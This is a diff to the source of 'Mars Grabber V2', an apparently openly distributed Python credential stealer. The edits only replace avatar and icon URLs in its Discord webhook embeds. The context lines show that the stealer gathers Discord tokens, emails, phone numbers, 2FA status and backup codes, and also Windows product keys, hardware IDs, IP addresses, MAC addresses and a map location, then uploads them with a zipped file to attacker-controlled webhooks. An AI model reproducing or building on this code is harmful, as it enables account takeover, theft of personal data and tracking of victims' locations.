@@ -1160,13 +1160,13 @@ class MarsGrabberV2(functions):
                             wfa = ("No discord backup codes found")
                         embed = {
                             "username": f"Dc Info | Mars Grabber V2",
-                            "avatar_url": "",
+                            "avatar_url": "https://i.imgur.com/a/xXdRENo.png",
                             "embeds": [
                                 {
                                     "author": {
                                         "name": "Destroy The Skids😎",
-                                        "url": "",
-                                        "icon_url": ""
+                                        "url": "https://i.imgur.com/a/xXdRENo.png",
+                                        "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                                     },
                                     "description": f"""**__Tokens__**```{token}\n\n{tokens}```__**Discord Info**__```Username: {user_name}\nUser ID: {user_id}\nToken: {token}\nNitro: {has_nitro}\nPhone Number: {phone_number}\nEmail: {email}\n2FA/MFA Enabled: {mfa_enabled}\n{wfa}```""",
                                     "color": 0x000000,
@@ -1176,7 +1176,7 @@ class MarsGrabberV2(functions):
                                     },
                                     "footer": {
                                         "text": "Mars Grabber V2",
-                                        "icon_url": ""
+                                        "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                                     },
                                 }
                             ]
@@ -1317,21 +1317,21 @@ class MarsGrabberV2(functions):
             self.exceptions.append(traceback.format_exc())
         embed = {
             "username": f"System Info | Mars Grabber V2",
-            "avatar_url": "",
+            "avatar_url": "https://i.imgur.com/a/xXdRENo.png",
             "title": "__Mars Grabber V2 System Info__",
             "embeds": [
                      {
                          "author": {
                              "name": "Destroy The Skids😎",
-                             "url": "",
-                             "icon_url": ""
+                             "url": "https://i.imgur.com/a/xXdRENo.png",
+                             "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                          },
                          "description": f"""__**System Info**__```HWID: {hardwareid}\nRAM: {ram}GB\nArchitecture: {ee}bit\nUsername: {pc_username}\nDisk: {disk}\nPlatform: {platform}\nBattery: {battery}\nPC-Name: {name}\nWindows key: {windowskey}\nCPU: {cpu}\nGPU: {gpu}\nRefresh rate: {rr}\nModel name: {mn}\nBuild manufacturer: {bm}\nResolution: {size}\nPath: {path}```__**Ip Info**__\n```IP: {ip}\nCity: {city}\nCountry: {country}\nRegion: {region}\nMAC Address: {mac}\nVPN/Proxy: {requests.get("http://ip-api.com/json?fields=proxy").json()["proxy"]}```[Google Maps Location]({googlemap})""",
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
                              "text": "Mars Grabber V2",
-                             "icon_url": ""
+                             "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                          },
                      }
             ]
@@ -1361,28 +1361,28 @@ class MarsGrabberV2(functions):
         embed = {
             "username": f"{name} | Mars Grabber V2",
             "content": content,
-            "avatar_url": "",
+            "avatar_url": "https://i.imgur.com/a/xXdRENo.png",
             "title": "__Mars Grabber V2__",
             "embeds": [
                      {
                          "author": {
-                             "name": "",
-                             "url": "",
-                             "icon_url": ""
+                             "name": "Mars Grabber V2",
+                             "url": "https://i.imgur.com/a/xXdRENo.png",
+                             "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                          },
                          "description": description,
                          "color": 0x000000,
                          "timestamp": time.strftime("%Y-%m-%dT%H:%M:%S.000Z", time.gmtime()),
                          "footer": {
                              "text": "Mars Grabber V2",
-                             "icon_url": ""
+                             "icon_url": "https://i.imgur.com/a/xXdRENo.png"
                         }
                     }
             ]
         }
         file = {
             "username": f"{name} | Mars Grabber V2",
-            "avatar_url": ""
+            "avatar_url": "https://i.imgur.com/a/xXdRENo.png"
         }
         if int(len(description)) <= 4096:
             with open(_zipfile, 'rb') as f:
@@ -1407,7 +1407,7 @@ class MarsGrabberV2(functions):
                                   'file': open(_zipfile, 'rb')}).json()["data"]["downloadPage"]
                 embed = {
                     "username": f"{name} | Mars Grabber V2",
-                    "avatar_url": "https://i.imgur.com/bbWgtHI.png",
+                    "avatar_url": "https://i.imgur.com/a/xXdRENo.png",
                     "title": "__Mars Grabber V2__",
                     "content": content+f" {f}",
                 }
